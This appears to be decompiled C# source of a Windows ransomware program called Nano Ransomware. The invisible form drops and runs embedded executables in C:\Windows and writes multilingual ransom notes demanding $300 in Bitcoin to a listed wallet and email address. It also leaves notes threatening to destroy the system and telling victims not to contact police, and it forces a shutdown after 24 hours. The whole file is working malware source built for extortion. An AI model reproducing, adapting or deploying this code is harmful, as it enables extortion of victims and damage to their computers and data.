using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace Nano_Ransomware_1_;

public class Form1 : Form
{
	private IContainer components = null;

	private Timer tmr_out;

	public Form1()
	{
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("There was an error running this program, please install YouAreInfected.dll", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		MessageBox.Show("You only have 24 hours to complete the payment, if the payment isn't made by tomorrow night, we'll brick your entire system.", "Nano_Inf0rmation", (MessageBoxButtons)0, (MessageBoxIcon)48);
		wallapepr();
		dropRansomNote();
		Extract("Nano_Ransomware_1_", "C:\\Windows", "Resources", "RANSOM.exe");
		Process.Start("C:\\\\Windows\\\\RANSOM.exe");
		dropRansomQuestions();
		dropRuleNote();
		dropDecryptor();
		tmr_out.Start();
	}

	public static void dropRansomNote()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using (StreamWriter streamWriter = File.CreateText(folderPath + "\\Nano_Decrypt0r.txt"))
		{
			streamWriter.WriteLine("Your files are encrypted by Nano Ransomware, meaning that your data is encrypted with an military grade encryption.");
			streamWriter.WriteLine("To gain the ability to access your data back, or decrypt, you will need to pay for it, obviosly.The payment is accepted only in Bitcoin");
			streamWriter.WriteLine("The price is $300, send the exact amount to 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG .");
			streamWriter.WriteLine("Once you send the payment, e-mail danielnusradin@gmail.com your BTC transaction ID, and wait for a reply.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
			streamWriter.WriteLine("+----------------------------------------Russian--------------------------------------------------------+");
			streamWriter.WriteLine("Ваши файлы зашифрованы Nano Ransomware, что означает, что ваши данные зашифрованы шифрованием военного уровня.");
			streamWriter.WriteLine("Чтобы получить возможность получить доступ к своим данным или расшифровать их, вам, очевидно, нужно будет заплатить за это. Оплата принимается только в биткойнах.");
			streamWriter.WriteLine("Цена $300, точную сумму отправьте на 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG.");
			streamWriter.WriteLine("После того, как вы отправите платеж по электронной почте danielnusradin@gmail.com, укажите идентификатор транзакции BTC и дождитесь ответа.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
			streamWriter.WriteLine("+----------------------------------------Azerbaijan--------------------------------------------------------+");
			streamWriter.WriteLine("Fayllarınız Nano Ransomware tərəfindən şifrələnir, yəni məlumatlarınız hərbi dərəcəli şifrələmə ilə şifrələnir.");
			streamWriter.WriteLine("Məlumatlarınıza geri daxil olmaq və ya şifrəni açmaq imkanı əldə etmək üçün siz bunun üçün ödəniş etməlisiniz, açıq-aydın. Ödəniş yalnız Bitcoin-də qəbul edilir.");
			streamWriter.WriteLine("Qiymət 300 dollardır, dəqiq məbləği 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG ünvanına göndərin.");
			streamWriter.WriteLine("Ödəniş e-poçtunu danielnusradin@gmail.com ünvanına göndərdikdən sonra BTC əməliyyat ID-nizi göndərin və cavabı gözləyin.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
			streamWriter.WriteLine("+----------------------------------------Chinese-------------------------------------------------------- +");
			streamWriter.WriteLine("您的文件由 Nano Ransomware 加密，这意味着您的数据使用军用级加密进行加密.");
			streamWriter.WriteLine("要获得取回您的数据或解密的能力，您显然需要为此付费。付款仅接受比特币”");
			streamWriter.WriteLine("价格为 300 美元，将确切金额发送至 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG 。");
			streamWriter.WriteLine("一旦您将您的 BTC 交易 ID 发送到付款电子邮件 danielnusradin@gmail.com，然后等待回复。”");
			streamWriter.WriteLine("您应该会收到来自同一地址的回复，只是这次带有解密密钥。");
			streamWriter.WriteLine("+----------------------------------------Italian-------------------------------------------------------- +");
			streamWriter.WriteLine("I tuoi file sono crittografati da Nano Ransomware, il che significa che i tuoi dati sono crittografati con una crittografia di livello militare.");
			streamWriter.WriteLine("Per ottenere la possibilità di accedere ai tuoi dati, o decrittarli, dovrai pagarli, ovviamente. Il pagamento è accettato solo in Bitcoin");
			streamWriter.WriteLine("Il prezzo è di $ 300, invia l'importo esatto a 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG .");
			streamWriter.WriteLine("Una volta inviato il pagamento, invia un'e-mail a danielnusradin@gmail.com con il tuo ID transazione BTC e attendi una risposta.");
			streamWriter.WriteLine("You should receive a reply from the same address, only this time with a decryption Key.");
		}
		Process.Start("C:\\\\Users\\\\" + Environment.UserName + "\\Desktop\\Nano_Decrypt0r.txt");
	}

	public static void wallapepr()
	{
		Extract("Nano_Ransomware_1_", "C:\\Windows", "Resources", "isudioewudo.exe");
		Process.Start("C:\\\\Windows\\\\isudioewudo.exe");
	}

	private void dropDecryptor()
	{
		Extract("Nano_Ransomware_1_", "C:\\Users\\" + Environment.UserName + "\\Desktop", "Resources", "Nano_Decrypt00r.exe");
	}

	public static void dropRansomQuestions()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using StreamWriter streamWriter = File.CreateText(folderPath + "\\FAQ.txt");
		streamWriter.WriteLine("What happened to my data? Your files are encrypted/locked with a special algorythm,");
		streamWriter.WriteLine("to recover your data you need to decrypt yur data.What is the term 'encryption?'");
		streamWriter.WriteLine("It's when a text or file is converted from plain text to cipher text.");
		streamWriter.WriteLine("What is the term 'cipher text?'");
		streamWriter.WriteLine("Cipher text is something unreadble, like 'WDWYDIWYD8WDUWYDIYWDITWD得取回.'");
		streamWriter.WriteLine("What is the term 'plain text?'");
		streamWriter.WriteLine("Plain Text is something readable, it's something what a human being can understand.");
		streamWriter.WriteLine("What is going to happen if i am not going to pay?");
		streamWriter.WriteLine("After 24 hours your computer will crash and overwrite the master boot record, resulting in your");
		streamWriter.WriteLine("system being broken/damaged.");
	}

	public static void dropRuleNote()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using StreamWriter streamWriter = File.CreateText(folderPath + "\\READ_ME.txt");
		streamWriter.WriteLine("These are the rules to keep your system safe from being destroyed.");
		streamWriter.WriteLine("Please do not try to open task manager and kill the Ransomware, even if you do...");
		streamWriter.WriteLine("it would make it impossible for you to recover your data, and also of your system crashing.");
		streamWriter.WriteLine("Please do not try to re-name the encrypted files, as the files would still be converted");
		streamWriter.WriteLine("to Cipher Text, the only way for you to recover your data is by decryption! Nothing else!");
		streamWriter.WriteLine("Please do not try to call the cops, as there is nothing they can do about it.");
		streamWriter.WriteLine("Sure you can try to format the computerm but all the found data in this hard disks will be lost");
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		ProcessStartInfo processStartInfo = new ProcessStartInfo("shutdown", "/s /t 0");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		Process.Start(processStartInfo);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		tmr_out = new Timer(components);
		((Control)this).SuspendLayout();
		tmr_out.set_Interval(86400000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(188, 34));
		((Form)this).set_ControlBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
